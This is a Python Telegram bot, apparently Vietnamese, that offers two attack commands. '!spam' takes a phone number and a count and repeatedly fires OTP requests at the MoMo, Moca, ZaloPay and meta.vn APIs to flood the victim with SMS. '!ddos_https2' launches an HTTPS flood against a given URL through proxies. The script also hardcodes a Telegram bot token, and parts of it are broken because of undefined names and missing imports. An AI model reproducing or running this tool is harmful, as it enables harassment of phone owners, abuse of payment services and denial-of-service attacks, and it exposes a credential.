import telebot
import requests
import time
import uuid
import random
import threading

#Token BOT Telegram
bot = telebot.TeleBot("5657214860:AAFd-vV8KBulX0I4_pkAZcZ3ga-r8oEZNcA")

#Lệnh Khởi Đầu
@bot.message_handler(commands=['start'])
def send_welcome(message):
    text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\nHii"
    bot.send_message(message.chat.id, text)

#Lệnh Giúp Đỡ
@bot.message_handler(commands=['help'])
def send_help(message):
    text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ Tất Cả Các Lệnh ]\n\n > /start Lệnh Khởi Đầu\n > /help Lệnh Giúp Đỡ"
    bot.send_message(message.chat.id, text)

#Lệnh SPAM
@bot.message_handler(regexp="!spam")
def handle_message(message):
    if len(message.text) == 21:
        phone = message.text.split(" ")[1]
        so_lan = message.text.split(" ")[2]
        text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ SPAM ]\n  • SĐT: "+phone+"\n  • Số Lần: "+so_lan

        bot.send_message(message.chat.id, text)
        SPAM(phone,so_lan).run()
    else:
        text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ Bạn Đã Nhập Sai Lệnh ]"
        bot.send_message(message.chat.id, text)

#DDOS_HTTPS2
@bot.message_handler(regexp="!ddos_https2")
def handle_message(message):
    url = message.text.split(" ")[1]
    floodtime = message.text.split(" ")[2]
    text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ SPAM ]\n  • URL: "+url+"\n  • Thời Gian: "+floodtime+" Giây"
    bot.send_message(message.chat.id, text)
    with open("utils/http.txt", 'w') as p:
        p.write(httpx.get(http_proxy).text)
    subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)


























class SPAM:
    def __init__(self,phone, so_lan):
        self.phone = phone
        self.sl = so_lan
        self.appVer = '40123'
        self.appCode = '4.0.12'
        self.time_zone = int(round(time.time() * 1000))
        self.imei = uuid.uuid4()
        self.token = f'{self.random_string(22)}:{self.random_string(53)}-{self.random_string(86)}'

    def random_string(self, length):
        number = '0123456789'
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
        id = ''
        for i in range(0,length,2):
            id += random.choice(number)
            id += random.choice(alpha)
        return id

    def send_otp(self):
        headers1 = {
            'agent_id': 'undefined',
            'sessionkey': '',
            'user_phone': 'undefined',
            'authorization': 'Bearer undefined',
            'msgtype': 'CHECK_USER_BE_MSG',
            'Host': 'api.momo.vn',
            'User-Agent': 'okhttp/3.14.17',
            'app_version': self.appVer,
            'app_code': self.appCode,
            'device_os': 'Android',
        }
        data1 = {
            'user': self.phone,
            'msgType': 'CHECK_USER_BE_MSG',
            'cmdId': f'{self.time_zone}000000',
            'lang': 'vi',
            'time': self.time_zone,
            'channel': 'APP',
            'appVer': self.appVer,
            'appCode': self.appCode,
            'deviceOS': 'ANDROID',
            'buildNumber': 0,
            'appId': 'vn.momo.platform',
            'result': 'true',
            'errorCode': 0,
            'errorDesc': '',
            'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone  6s',
                    'firmware': '23',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Viettel',
                    'icc': '',
                    'mcc': '452',
                    'device_os': 'Android',
                    'secure_id': '',
            },
            'extra': {
                'checkSum': '',
            },
        }
        response = requests.post('https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG', headers=headers1, json=data1)
        time.sleep(1)
            
        headers2 = {
            'agent_id': 'undefined',
            'sessionkey': '',
            'user_phone': 'undefined',
            'authorization': 'Bearer undefined',
            'msgtype': 'SEND_OTP_MSG',
            'Host': 'api.momo.vn',
            'User-Agent': 'okhttp/3.14.17',
            'app_version': self.appVer,
            'app_code': self.appCode,
            'device_os': 'Android'
        }
        data2 = {
            'user': self.phone,
            'msgType': 'SEND_OTP_MSG',
            'cmdId': f'{self.time_zone}000000',
            'lang':  'vi',
            'time': self.time_zone,
            'channel': 'APP',
            'appVer': self.appVer,
            'appCode': self.appCode,
            'deviceOS':  'ANDROID',
            'buildNumber': 0,
            'appId': 'vn.momo.platform',
            'result': True,
            'errorCode':  0,
            'errorDesc': '',
            'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode':  '084',
                    'device': 'iPhone 6s',
                    'firmware': '23',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': '',
                    'icc': '',
                    'mcc': '452',
                    'device_os': 'Android',
                    'secure_id': '',
        },
            'extra': {
                    'action': 'SEND',
                    'rkey': self.random_string(20),
                    'AAID': self.token,
                    'IDFA': '',
                    'TOKEN': self.token,
                    'SIMULATOR': False,
                    'SECUREID': '',
                    'MODELID': str(self.imei),
                    'isVoice': False,
                    'REQUIRE_HASH_STRING_OTP': True,
                    'checkSum': '',
            },
        }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/', headers=headers2, json=data2).json()['errorDesc']
            if 'Thành công' in response:
                print("MOMO: "+response)
            else:
                print("MOMO: "+response)
        except:
            print("MOMO: BAD REQUESTS LIMIT!")

        headers = {
            'Host': 'moca.vn',
            'Accept': '*/*',
            'Device-Token': str(self.imei),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'vi',
            'X-Moca-Api-Version': '2',
            'platform': 'P_IOS-2.10.42',
            'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',
        }
        params = {
            'phoneNumber': self.phone,
        }

        try:
            home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
            token = home['data']['registrationId']
            response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
            print("MOCA: SUCCESS!")
        except:
            print("MOCA: ERROR!")

        try:
            headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone3x',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            }
            params = {
                'phone_number': self.phone,
            }

            token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
            json_data = {
                'phone_number': self.phone,
                'send_otp_token': token,
            }

            response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
            print("ZALOPAY: SUCCESS!")
        except:
            print("ZALOPAY: ERROR!")

        try:
            params = {
                'api_mode': '1',
            }
            json_data = {
                'api_args': {
                    'lgUser': self.phone,
                    'act': 'send',
                    'type': 'phone',
                    },
                'api_method': 'CheckExist',
            }

            response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=self.ua, json=json_data).text
            print("METAVN: SUCCESS!")
        except:
            print("METAVN: ERROR!")

    def run(self):
        threads = []
        for i in range(int(self.sl)):
            t = threading.Thread(target = self.send_otp())
            t.start()
            threads.append(t)
            time.sleep(5)
        for t in threads:
            t.join()















bot.infinity_polling()